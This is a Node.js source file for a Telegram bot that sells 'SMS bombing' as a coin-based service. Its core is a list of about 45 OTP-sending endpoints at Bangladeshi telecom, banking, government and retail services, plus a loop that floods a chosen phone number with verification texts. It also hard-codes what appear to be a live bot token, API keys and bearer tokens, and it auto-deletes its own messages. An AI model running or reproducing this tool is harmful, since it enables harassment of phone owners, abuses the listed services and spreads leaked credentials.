const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Files
const DATA_DIR = './database';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

const DB_FILE = `${DATA_DIR}/users.json`;
const HISTORY_FILE = `${DATA_DIR}/history.json`;
const RN_FILE = `${DATA_DIR}/restricted.json`;

let userData = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE)) : {};
let historyData = fs.existsSync(HISTORY_FILE) ? JSON.parse(fs.readFileSync(HISTORY_FILE)) : [];
let restrictedNumbers = fs.existsSync(RN_FILE) ? JSON.parse(fs.readFileSync(RN_FILE)) : [];

function saveData() {
    fs.writeFileSync(DB_FILE, JSON.stringify(userData, null, 2));
    fs.writeFileSync(HISTORY_FILE, JSON.stringify(historyData, null, 2));
    fs.writeFileSync(RN_FILE, JSON.stringify(restrictedNumbers, null, 2));
}

// Render server
const app = express();
app.get('/', (req, res) => res.send('Bot Status: Online'));
app.listen(process.env.PORT || 3000);

// API List (Same as before)
const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

// Keyboards
const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info']
]).resize();

// Helper Functions
async function autoDelete(ctx, msgId, delay = 600000) {
    setTimeout(async () => {
        try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
    }, delay);
}

function isBanned(uid) {
    if (userData[uid]?.bannedUntil && userData[uid].bannedUntil > Date.now()) return true;
    return false;
}

function registerUser(ctx) {
    const uid = ctx.from.id;
    if (!userData[uid]) {
        userData[uid] = { 
            name: ctx.from.first_name, 
            coins: 50, 
            lastBonus: 0, 
            totalRequests: 0, 
            bannedUntil: 0 
        };
        saveData();
        return true;
    }
    return false;
}

// Start Command & Referral
bot.start(async (ctx) => {
    const uid = ctx.from.id;
    const isNew = registerUser(ctx);
    
    // Referral Logic
    const refBy = ctx.startPayload;
    if (isNew && refBy && userData[refBy] && refBy != uid) {
        userData[refBy].coins += 100;
        ctx.telegram.sendMessage(refBy, `🎊 আপনার রেফার লিংকে নতুন ইউজার যুক্ত হয়েছে! আপনি ১০০ কয়েন পেয়েছেন।`);
        saveData();
    }

    const welcomeMsg = await ctx.reply(`👋 স্বাগতম ${ctx.from.first_name}!\nআপনার UID: <code>${uid}</code>\nরেফার লিংক: <code>https://t.me/${ctx.botInfo.username}?start=${uid}</code>`, { parse_mode: 'HTML', ...mainMenu });
    autoDelete(ctx, ctx.message.message_id, 300000);
});

// Help Command
bot.command('help', async (ctx) => {
    const helpText = `🛠 **কমান্ড লিস্ট:**\n/start - শুরু করুন\n/boom - বোম্বিং শুরু\n/balance - ব্যালেন্স দেখুন\n/ck - ডেইলি বোনাস (৫০ কয়েন)\n/history - আপনার হিস্টরি\n/info - আইডি তথ্য\n\n🛡 **এডমিন কমান্ড:**\n/recharge <uid> <amount>\n/ban <uid> <days>\n/uban <uid>\n/list user - ইউজার লিস্ট\n/rn <number> - নম্বর নিষিদ্ধ\n/list rn - নিষিদ্ধ তালিকা\n/history - গ্লোবাল হিস্টরি\n\n👤 Admin: @Tnayem48`;
    const msg = await ctx.reply(helpText, { parse_mode: 'Markdown' });
    if(ctx.from.id === ADMIN_ID) autoDelete(ctx, msg.message_id, 300000);
});

// Admin Broadcast
bot.command('broadcast', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.session = { step: 'broadcast_msg' };
    ctx.reply("📢 ব্রডকাস্ট মেসেজটি লিখুন (ছবিসহ পাঠাতে পারেন):");
});

// Admin Recharge
bot.command('recharge', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply("Usage: /recharge uid amount");
    const target = args[1];
    const amount = parseInt(args[2]);
    if (userData[target]) {
        userData[target].coins += amount;
        saveData();
        ctx.reply(`✅ ইউজার ${target} এর অ্যাকাউন্টে ${amount} কয়েন আপডেট করা হয়েছে।`);
    }
});

// History Command
bot.command('history', async (ctx) => {
    const uid = ctx.from.id;
    let records = [];
    if (uid === ADMIN_ID) {
        records = historyData.slice(-10).reverse();
    } else {
        records = historyData.filter(h => h.uid === uid).slice(-10).reverse();
    }

    if (records.length === 0) return ctx.reply("📭 কোনো হিস্টরি পাওয়া যায়নি।");
    
    let text = "📜 **সর্বশেষ ১০টি রেকর্ড:**\n\n";
    records.forEach((r, i) => {
        text += `${i+1}. 📱 ${r.phone} | 🔢 ${r.amount} | 🕒 ${new Date(r.time).toLocaleString('en-GB')}\n`;
    });
    ctx.reply(text, { parse_mode: 'Markdown' });
});

// Restricted Numbers Logic
bot.command('rn', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const input = ctx.message.text.split(' ')[1];
    if (!input) return;

    if (input.startsWith('-')) {
        const num = input.substring(1);
        restrictedNumbers = restrictedNumbers.filter(n => n !== num);
        ctx.reply(`✅ ${num} নিষিদ্ধ তালিকা থেকে বাদ দেওয়া হয়েছে।`);
    } else {
        restrictedNumbers.push(input);
        ctx.reply(`🚫 ${input} নম্বরটি নিষিদ্ধ করা হয়েছে।`);
    }
    saveData();
});

bot.command('list', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const type = ctx.message.text.split(' ')[1];
    if (type === 'rn') {
        ctx.reply(`🚫 **নিষিদ্ধ নম্বর তালিকা:**\n${restrictedNumbers.join('\n') || 'তালিকা খালি'}`);
    } else if (type === 'user') {
        let list = "👥 **ইউজার লিস্ট:**\n";
        Object.keys(userData).forEach(uid => {
            list += `👤 ${userData[uid].name} | ID: <code>${uid}</code> | 💰 ${userData[uid].coins} | 🚀 ${userData[uid].totalRequests}\n`;
        });
        ctx.reply(list, { parse_mode: 'HTML' });
    }
});

// Ban / Unban
bot.command('ban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1];
    const days = parseInt(args[2]) || 365;
    if (userData[target]) {
        userData[target].bannedUntil = Date.now() + (days * 24 * 60 * 60 * 1000);
        saveData();
        ctx.reply(`🚫 ইউজার ${target} কে ${days} দিনের জন্য ব্যান করা হয়েছে।`);
    }
});

bot.command('uban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const target = ctx.message.text.split(' ')[1];
    if (userData[target]) {
        userData[target].bannedUntil = 0;
        saveData();
        ctx.reply(`✅ ইউজার ${target} কে আনব্যান করা হয়েছে।`);
    }
});

// Bonus & Info Handlers
bot.command('ck', (ctx) => handleBonus(ctx));
bot.hears('🎁 Daily Bonus', (ctx) => handleBonus(ctx));
bot.hears('💰 Balance', (ctx) => ctx.reply(`💰 আপনার বর্তমান ব্যালেন্স: ${userData[ctx.from.id]?.coins || 0} কয়েন`));
bot.hears('ℹ️ Info', (ctx) => ctx.reply(`👤 নাম: ${ctx.from.first_name}\n🆔 UID: <code>${ctx.from.id}</code>\n🚀 মোট রিকোয়েস্ট: ${userData[ctx.from.id]?.totalRequests || 0}\n👤 এডমিন: @Tnayem48`, { parse_mode: 'HTML' }));

async function handleBonus(ctx) {
    const uid = ctx.from.id;
    if (isBanned(uid)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
    const diff = (Date.now() - (userData[uid].lastBonus || 0)) / (1000 * 60 * 60);
    if (diff >= 24) {
        userData[uid].coins += 50;
        userData[uid].lastBonus = Date.now();
        saveData();
        ctx.reply("✅ অভিনন্দন! আপনি ৫০ কয়েন বোনাস পেয়েছেন।");
    } else {
        ctx.reply(`❌ দয়া করে ${(24 - diff).toFixed(1)} ঘণ্টা পর চেষ্টা করুন।`);
    }
}

// Bombing Flow
bot.hears('🚀 Boom', (ctx) => {
    if (isBanned(ctx.from.id)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
    ctx.session = { step: 'get_phone' };
    ctx.reply("📱 বোম্বিং নম্বরটি দিন:");
});

bot.command('bm', (ctx) => {
    if (isBanned(ctx.from.id)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
    const args = ctx.message.text.split(' ');
    if (args.length === 3) startBombing(ctx, args[1], parseInt(args[2]));
});

// Text & Message Handler
bot.on('message', async (ctx) => {
    const uid = ctx.from.id;
    
    // Broadcast Handle
    if (uid === ADMIN_ID && ctx.session?.step === 'broadcast_msg') {
        let count = 0;
        const users = Object.keys(userData);
        for (let user of users) {
            try {
                if (ctx.message.photo) {
                    await ctx.telegram.sendPhoto(user, ctx.message.photo[0].file_id, { caption: ctx.message.caption });
                } else {
                    await ctx.telegram.sendMessage(user, ctx.message.text);
                }
                count++;
            } catch (e) {}
        }
        ctx.reply(`📢 ব্রডকাস্ট সম্পন্ন! মোট ${count} জন ইউজার পেয়েছে।`);
        ctx.session = {};
        return;
    }

    // Boom Step Handle
    if (ctx.session?.step === 'get_phone') {
        ctx.session.phone = ctx.message.text;
        ctx.session.step = 'get_amount';
        ctx.reply("🔢 পরিমাণ দিন (১-১০০):");
    } else if (ctx.session?.step === 'get_amount') {
        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
        ctx.session = {};
    }
});

// Main Bombing Function
async function startBombing(ctx, phone, amount) {
    const uid = ctx.from.id;
    if (restrictedNumbers.includes(phone)) return ctx.reply("❌ দুঃখিত, এই নম্বরটি এডমিন দ্বারা প্রটেক্টেড।");
    if (userData[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");
    if (isNaN(amount) || amount > 100) return ctx.reply("❌ ভুল পরিমাণ (সর্বোচ্চ ১০০)।");

    const statusMsg = await ctx.reply(`🚀 কাজ শুরু হয়েছে (${phone})...`);
    let success = 0, errors = 0, apiIdx = 0;

    // Fast Loop
    while (success < amount) {
        const api = SMS_APIS[apiIdx % SMS_APIS.length];
        apiIdx++;
        try {
            const config = {
                method: api.method, url: api.url, headers: api.headers || {}, timeout: 5000,
                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone)
            };
            await axios(config);
            success++;
        } catch (e) { errors++; }
        await new Promise(r => setTimeout(r, 100));
        if (apiIdx > amount + 200) break;
    }

    userData[uid].coins -= amount;
    userData[uid].totalRequests += 1;
    historyData.push({ uid, phone, amount, time: Date.now() });
    saveData();

    const finalMsg = await ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n⚠️ ব্যর্থ: ${errors}\n💰 বর্তমান ব্যালেন্স: ${userData[uid].coins}`, mainMenu);
    
    // Auto Clean
    autoDelete(ctx, ctx.message.message_id, 300000);
    autoDelete(ctx, statusMsg.message_id, 300000);
    autoDelete(ctx, finalMsg.message_id, 300000);
}

bot.launch().then(() => console.log("Bot started with full features!"));
